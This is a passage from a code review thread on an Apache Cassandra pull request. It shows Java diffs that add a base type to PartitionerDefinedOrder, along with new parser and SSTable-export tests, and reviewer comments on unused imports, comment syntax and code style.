         ColumnMetadata indexedColumn = target.left;
         AbstractType<?> indexedValueType = utils.getIndexedValueType(indexedColumn);
 
+        AbstractType<?> indexedTablePartitionKeyType =  baseCfsMetadata.partitioner.partitionOrdering();

Review Comment:
   ok, good point.



;01/Feb/23 13:33;githubbot;600","adelapena commented on code in PR #2118:
URL: https://github.com/apache/cassandra/pull/2118#discussion_r1093497565


##########
src/java/org/apache/cassandra/index/internal/CassandraIndex.java:
##########
@@ -45,6 +45,7 @@
 import org.apache.cassandra.db.lifecycle.View;
 import org.apache.cassandra.db.marshal.AbstractType;
 import org.apache.cassandra.db.marshal.CollectionType;
+import org.apache.cassandra.db.marshal.PartitionerDefinedOrder;

Review Comment:
   This and a couple other unused imports are breaking the build



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -131,6 +138,56 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * Parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */
+    private static AbstractType<?> defaultParsePartitionOrdering(TypeParser typeParser)
+    {
+        IPartitioner partitioner = DatabaseDescriptor.getPartitioner();
+        Iterator<String> argIterator = typeParser.getKeyValueParameters().keySet().iterator();
+        if (argIterator.hasNext())
+        {
+            partitioner = FBUtilities.newPartitioner(argIterator.next());
+            assert !argIterator.hasNext();
+        }
+        return partitioner.partitionOrdering(null);
+    }
+
+    /**
+     * Parse and return the real {@link PartitionerDefinedOrder} from the string variable {@link #str}.
+     * The {@link #str} format can be like {@code PartitionerDefinedOrder(<partitioner>)} or
+     * {@code PartitionerDefinedOrder(<partitioner>:<baseType>)}.
+     * */

Review Comment:
   Same as before, this should be `*/`:
   ```suggestion
        */
   ```



##########
test/unit/org/apache/cassandra/dht/LengthPartitioner.java:
##########
@@ -175,8 +175,8 @@ public AbstractType<?> getTokenValidator()
         return IntegerType.instance;
     }
 
-    public AbstractType<?> partitionOrdering()
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType)
     {
-        return new PartitionerDefinedOrder(this);
+        return new PartitionerDefinedOrder(this).withBaseType(baseType);

Review Comment:
   Nit: could be `new PartitionerDefinedOrder(this, baseType)`, since we publicly expose that constructor overload.



##########
test/unit/org/apache/cassandra/db/marshal/TypeParserTest.java:
##########
@@ -95,14 +101,123 @@ public void testParseError()
     @Test
     public void testParsePartitionerOrder() throws ConfigurationException, SyntaxException
     {
-        for (IPartitioner partitioner: new IPartitioner[] { Murmur3Partitioner.instance,
-                                                            ByteOrderedPartitioner.instance,
-                                                            RandomPartitioner.instance,
-                                                            OrderPreservingPartitioner.instance })
+        assertForEachPartitioner(partitioner -> {
+            AbstractType<?> type = partitioner.partitionOrdering(null);
+            assertEquals(type, TypeParser.parse(type.toString()));
+        });
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(null), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+    
+    @Test
+    public void testParsePartitionerOrderWithBaseType()
+    {
+        // default partitioner
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(null), TypeParser.parse(""PartitionerDefinedOrder""));
+
+        // PartitionerDefinedOrder's base type is not composite type
+        differentBaseTypeValidation(Int32Type.instance);
+        // PartitionerDefinedOrder's base type is composite type
+        differentBaseTypeValidation(CompositeType.getInstance(Int32Type.instance, UTF8Type.instance));
+        // PartitionerDefinedOrder's base type is tuple type
+        differentBaseTypeValidation(new TupleType(Lists.newArrayList(Int32Type.instance, UTF8Type.instance)));
+        // PartitionerDefinedOrder's base type is ReversedType
+        differentBaseTypeValidation(ReversedType.getInstance(Int32Type.instance));
+        // PartitionerDefinedOrder's base type is CollectionType
+        differentBaseTypeValidation(MapType.getInstance(Int32Type.instance, UTF8Type.instance, false));
+    }
+
+    @Test
+    public void testParsePartitionerOrderMistMatch()
+    {
+        assertForEachPartitioner(partitioner -> {
+            AbstractType<?> type = partitioner.partitionOrdering(null);
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(Int32Type.instance);
+                boolean result = partitioner.partitionOrdering(null).equals(TypeParser.parse(type.toString()));
+                assertFalse(result);
+            }
+            else
+            {
+                // ByteOrderedPartitioner.instance and OrderPreservingPartitioner.instance's partitionOrdering will not be PartitionerDefinedOrder
+                boolean result = partitioner.partitionOrdering(null).equals(TypeParser.parse(type.toString()));
+                assertTrue(result);
+            }
+        });
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(null), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+
+    @Test
+    public void testParsePartitionerOrderWithErrorFormat()
+    {
+        assertForEachPartitioner(partitioner -> {
+            AbstractType<?> type = partitioner.partitionOrdering(null);
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                // only Murmur3Partitioner and RandomPartitioner's partitionOrdering() are instanceof PartitionerDefinedOrder
+                String msgPartitioner = partitioner instanceof Murmur3Partitioner ? ""Murmur3Partitioner"" : ""RandomPartitioner"";
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner,
+                String tmpStr1 =  type.toString().replace(')', ',');
+                try
+                {
+                    TypeParser.parse(tmpStr1);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    assertTrue(t.getCause().getMessage().contains(""Syntax error parsing 'org.apache.cassandra.db.marshal.PartitionerDefinedOrder(org.apache.cassandra.dht."" + msgPartitioner + "",: for msg unexpected character ','""));
+                }
+
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner>
+                String tmpStr2 =  type.toString().replace(')', '>');
+                try
+                {
+                    TypeParser.parse(tmpStr2);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    assertTrue(t.getCause().getMessage().contains(""Syntax error parsing 'org.apache.cassandra.db.marshal.PartitionerDefinedOrder(org.apache.cassandra.dht."" + msgPartitioner + "">: for msg unexpected character '>'""));
+                }
+
+                // error format PartitionerDefinedOrder(org.apache.cassandra.dht.Murmur3Partitioner>
+                String tmpStr3 =  type.toString().replace(')', ':');
+                try
+                {
+                    TypeParser.parse(tmpStr3);
+                    fail();
+                }
+                catch (Throwable t)
+                {
+                    assertTrue(t.getCause().getMessage().contains(""Unable to find abstract-type class 'org.apache.cassandra.db.marshal.'""));
+                }
+            }
+        });
+        assertEquals(DatabaseDescriptor.getPartitioner().partitionOrdering(null), TypeParser.parse(""PartitionerDefinedOrder""));
+    }
+
+    private void differentBaseTypeValidation(AbstractType<?> baseType)
+    {
+        assertForEachPartitioner(partitioner -> {
+            AbstractType<?> type = partitioner.partitionOrdering(null);
+            if (type instanceof PartitionerDefinedOrder)
+            {
+                PartitionerDefinedOrder tmp = (PartitionerDefinedOrder) type;
+                type = tmp.withBaseType(baseType);
+            }
+            assertEquals(type, TypeParser.parse(type.toString()));

Review Comment:
   Changing this from `assertSame` to `assertEquals` has left one of the unused imports that break the build.



##########
test/unit/org/apache/cassandra/tools/SecondaryIndexSSTableExportTest.java:
##########
@@ -0,0 +1,257 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.tools;
+
+
+import java.util.List;
+import java.util.Map;
+
+import org.apache.cassandra.utils.Pair;
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import com.fasterxml.jackson.core.type.TypeReference;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import org.apache.cassandra.cql3.CQLTester;
+import org.apache.cassandra.db.ColumnFamilyStore;
+import org.apache.cassandra.io.sstable.format.SSTableReader;
+
+import static org.junit.Assert.assertNotNull;
+import static org.junit.Assert.assertTrue;
+
+public class SecondaryIndexSSTableExportTest extends CQLTester
+{
+    private static final ObjectMapper mapper = new ObjectMapper();
+    private static final TypeReference<List<Map<String, Object>>> jacksonListOfMapsType = new TypeReference<List<Map<String, Object>>>() {};
+     
+    @BeforeClass
+    public static void beforeClass()
+    {
+        System.setProperty(org.apache.cassandra.tools.Util.ALLOW_TOOL_REINIT_FOR_TEST, ""true""); // Necessary for testing
+    }
+    
+    @AfterClass
+    public static void afterClass()
+    {
+        System.clearProperty(org.apache.cassandra.tools.Util.ALLOW_TOOL_REINIT_FOR_TEST);   
+    }
+    
+    @Test
+    public void testRegularColumnIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int PRIMARY KEY, v int)"";
+        String createIndex = ""CREATE INDEX ON %s (v)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())

Review Comment:
   This file has multiple `for` loops without a whitespace before the parenthesis:
   ```suggestion
           for (ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
   ```
   You can find the codestyle for the project here: https://cassandra.apache.org/_/development/code_style.html



##########
test/unit/org/apache/cassandra/db/marshal/PartitionerDefinedOrderTest.java:
##########
@@ -0,0 +1,65 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.db.marshal;
+
+import org.apache.cassandra.transport.ProtocolVersion;
+import org.assertj.core.api.Assertions;
+import org.junit.Test;
+
+import org.apache.cassandra.dht.ByteOrderedPartitioner;
+import org.apache.cassandra.dht.IPartitioner;
+import org.apache.cassandra.dht.Murmur3Partitioner;
+import org.apache.cassandra.dht.OrderPreservingPartitioner;
+import org.apache.cassandra.dht.RandomPartitioner;

Review Comment:
   This and a couple other unused imports are breaking the build



##########
src/java/org/apache/cassandra/db/marshal/TypeParser.java:
##########
@@ -131,6 +138,56 @@ public AbstractType<?> parse() throws SyntaxException, ConfigurationException
             return getAbstractType(name);
     }
 
+    /**
+     * Parse PartitionOrdering from old version of PartitionOrdering' string format 
+     * */

Review Comment:
   Same as in the review for 3.0 and my previous round for trunk: this should be `*/`:
   ```suggestion
        */
   ```



##########
src/java/org/apache/cassandra/dht/Murmur3Partitioner.java:
##########
@@ -416,9 +416,9 @@ public Token getMaximumToken()
         return new LongToken(Long.MAX_VALUE);
     }
 
-    public AbstractType<?> partitionOrdering()
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType)
     {
-        return partitionOrdering;
+        return ((PartitionerDefinedOrder)partitionOrdering).withBaseType(baseType);

Review Comment:
   Why not make the type `Murmur3Partitioner#partitionOrdering` a `PartitionerDefinedOrder`, so we don't have to cast it here?



##########
src/java/org/apache/cassandra/dht/IPartitioner.java:
##########
@@ -128,8 +128,9 @@ default Token getMaximumToken()
     /**
      * Abstract type that orders the same way as DecoratedKeys provided by this partitioner.
      * Used by secondary indices.
+     * @param baseType base type for PartitionerDefinedOrder
      */
-    public AbstractType<?> partitionOrdering();
+    public AbstractType<?> partitionOrdering(AbstractType<?> baseType);

Review Comment:
   A few nits:
   - The `public` keyword is redundant
   - The argument can be `null`
   - The argument could be named in a more specific way (updating the JavaDoc comment, including a mention of when it's expected to be `null`)
   
   ```suggestion
      AbstractType<?> partitionOrdering(@Nullable AbstractType<?> partitionKeyType);
   ```



##########
src/java/org/apache/cassandra/db/marshal/PartitionerDefinedOrder.java:
##########
@@ -88,7 +95,8 @@ public Term fromJSONObject(Object parsed)
     @Override
     public String toJSONString(ByteBuffer buffer, ProtocolVersion protocolVersion)
     {
-        throw new UnsupportedOperationException();
+        assert baseType != null : ""PartitionerDefinedOrder's toJSONString method need a baseType but now is null ."";

Review Comment:
   ```suggestion
           assert baseType != null : ""PartitionerDefinedOrder's toJSONString method needs a base type but now is null."";
   ```



##########
test/unit/org/apache/cassandra/tools/SecondaryIndexSSTableExportTest.java:
##########
@@ -0,0 +1,257 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.tools;
+
+
+import java.util.List;
+import java.util.Map;
+
+import org.apache.cassandra.utils.Pair;
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import com.fasterxml.jackson.core.type.TypeReference;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import org.apache.cassandra.cql3.CQLTester;
+import org.apache.cassandra.db.ColumnFamilyStore;
+import org.apache.cassandra.io.sstable.format.SSTableReader;
+
+import static org.junit.Assert.assertNotNull;
+import static org.junit.Assert.assertTrue;
+
+public class SecondaryIndexSSTableExportTest extends CQLTester
+{
+    private static final ObjectMapper mapper = new ObjectMapper();
+    private static final TypeReference<List<Map<String, Object>>> jacksonListOfMapsType = new TypeReference<List<Map<String, Object>>>() {};
+     
+    @BeforeClass
+    public static void beforeClass()
+    {
+        System.setProperty(org.apache.cassandra.tools.Util.ALLOW_TOOL_REINIT_FOR_TEST, ""true""); // Necessary for testing
+    }
+    
+    @AfterClass
+    public static void afterClass()
+    {
+        System.clearProperty(org.apache.cassandra.tools.Util.ALLOW_TOOL_REINIT_FOR_TEST);   
+    }
+    
+    @Test
+    public void testRegularColumnIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int PRIMARY KEY, v int)"";
+        String createIndex = ""CREATE INDEX ON %s (v)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+
+    @Test
+    public void testPartitionKeyIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int, v int, c text, primary key((k, v)))"";
+        String createIndex = ""CREATE INDEX ON %s (k)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+    
+    @Test
+    public void testKeysWithStaticIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, primary key(k, v))"";
+        String createIndex = ""CREATE INDEX ON %s (v)"";
+        String insert = ""INSERT INTO %s (k, v, s) VALUES (0, 0, 's')"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+
+    @Test
+    public void testClusteringIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (c)"";
+        String insert = ""INSERT INTO %s (k, v, s, c) VALUES (0, 0, 's', 10)"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+
+
+    @Test
+    public void testCollectionMapKeyIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (KEYS(m))"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+
+    @Test
+    public void testCollectionMapValueIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (VALUES(m))"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+
+    @Test
+    public void testCollectionListIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (l)"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+
+    @Test
+    public void testCollectionSetIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int , v int, s  text static, c bigint, m map<bigint, text>, l list<text>, st set<int>, primary key((k, v), c))"";
+        String createIndex = ""CREATE INDEX ON %s (st)"";
+        String insert = ""INSERT INTO %s (k, v, s, c, m, l, st) VALUES (0, 0, 's', 10, {100:'v'}, ['l1', 'l2'], {1, 2, 3})"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+    
+    private Pair<String, String> generateSstable(String createTableCql, String createIndexCql, String insertCql) throws Throwable 
+    {
+        String table = createTable(createTableCql);
+        String index  = createIndex(createIndexCql);

Review Comment:
   ```suggestion
           String index = createIndex(createIndexCql);
   ```



##########
test/unit/org/apache/cassandra/tools/SecondaryIndexSSTableExportTest.java:
##########
@@ -0,0 +1,257 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.tools;
+
+
+import java.util.List;
+import java.util.Map;
+
+import org.apache.cassandra.utils.Pair;
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import com.fasterxml.jackson.core.type.TypeReference;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import org.apache.cassandra.cql3.CQLTester;
+import org.apache.cassandra.db.ColumnFamilyStore;
+import org.apache.cassandra.io.sstable.format.SSTableReader;
+
+import static org.junit.Assert.assertNotNull;
+import static org.junit.Assert.assertTrue;
+
+public class SecondaryIndexSSTableExportTest extends CQLTester
+{
+    private static final ObjectMapper mapper = new ObjectMapper();
+    private static final TypeReference<List<Map<String, Object>>> jacksonListOfMapsType = new TypeReference<List<Map<String, Object>>>() {};
+     
+    @BeforeClass
+    public static void beforeClass()
+    {
+        System.setProperty(org.apache.cassandra.tools.Util.ALLOW_TOOL_REINIT_FOR_TEST, ""true""); // Necessary for testing
+    }
+    

Review Comment:
   There are multiple empty lines with trailing whitespaces in this file.
   ```suggestion
   
   ```



##########
test/unit/org/apache/cassandra/tools/SecondaryIndexSSTableExportTest.java:
##########
@@ -0,0 +1,257 @@
+/*
+ * Licensed to the Apache Software Foundation (ASF) under one
+ * or more contributor license agreements.  See the NOTICE file
+ * distributed with this work for additional information
+ * regarding copyright ownership.  The ASF licenses this file
+ * to you under the Apache License, Version 2.0 (the
+ * ""License""); you may not use this file except in compliance
+ * with the License.  You may obtain a copy of the License at
+ *
+ *     http://www.apache.org/licenses/LICENSE-2.0
+ *
+ * Unless required by applicable law or agreed to in writing, software
+ * distributed under the License is distributed on an ""AS IS"" BASIS,
+ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
+ * See the License for the specific language governing permissions and
+ * limitations under the License.
+ */
+
+package org.apache.cassandra.tools;
+
+
+import java.util.List;
+import java.util.Map;
+
+import org.apache.cassandra.utils.Pair;
+import org.junit.AfterClass;
+import org.junit.BeforeClass;
+import org.junit.Test;
+
+import com.fasterxml.jackson.core.type.TypeReference;
+import com.fasterxml.jackson.databind.ObjectMapper;
+import org.apache.cassandra.cql3.CQLTester;
+import org.apache.cassandra.db.ColumnFamilyStore;
+import org.apache.cassandra.io.sstable.format.SSTableReader;
+
+import static org.junit.Assert.assertNotNull;
+import static org.junit.Assert.assertTrue;
+
+public class SecondaryIndexSSTableExportTest extends CQLTester
+{
+    private static final ObjectMapper mapper = new ObjectMapper();
+    private static final TypeReference<List<Map<String, Object>>> jacksonListOfMapsType = new TypeReference<List<Map<String, Object>>>() {};
+     
+    @BeforeClass
+    public static void beforeClass()
+    {
+        System.setProperty(org.apache.cassandra.tools.Util.ALLOW_TOOL_REINIT_FOR_TEST, ""true""); // Necessary for testing
+    }
+    
+    @AfterClass
+    public static void afterClass()
+    {
+        System.clearProperty(org.apache.cassandra.tools.Util.ALLOW_TOOL_REINIT_FOR_TEST);   
+    }
+    
+    @Test
+    public void testRegularColumnIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int PRIMARY KEY, v int)"";
+        String createIndex = ""CREATE INDEX ON %s (v)"";
+        String insert = ""INSERT INTO %s (k, v) VALUES (0, 0)"";
+        Pair<String, String> tableIndex = generateSstable(createTable, createIndex, insert);
+        ColumnFamilyStore cfs = getColumnFamilyStore(KEYSPACE, tableIndex.left);
+        assertTrue(cfs.indexManager.hasIndexes());
+        assertNotNull(cfs.indexManager.getIndexByName(tableIndex.right));
+        for(ColumnFamilyStore columnFamilyStore : cfs.indexManager.getAllIndexColumnFamilyStores())
+        {
+            assertTrue(columnFamilyStore.isIndex());
+            for(SSTableReader sst : columnFamilyStore.getLiveSSTables())
+            {
+                String file = sst.getFilename();
+                ToolRunner.ToolResult tool = ToolRunner.invokeClass(SSTableExport.class, file);
+                List<Map<String, Object>> parsed = mapper.readValue(tool.getStdout(), jacksonListOfMapsType);
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""partition""));
+                assertNotNull(tool.getStdout(), parsed.get(0).get(""rows""));
+            }
+        }
+    }
+
+    @Test
+    public void testPartitionKeyIndex() throws Throwable
+    {
+        String createTable = ""CREATE TABLE %s (k int, v int, c text, primary key((k, v)))"";
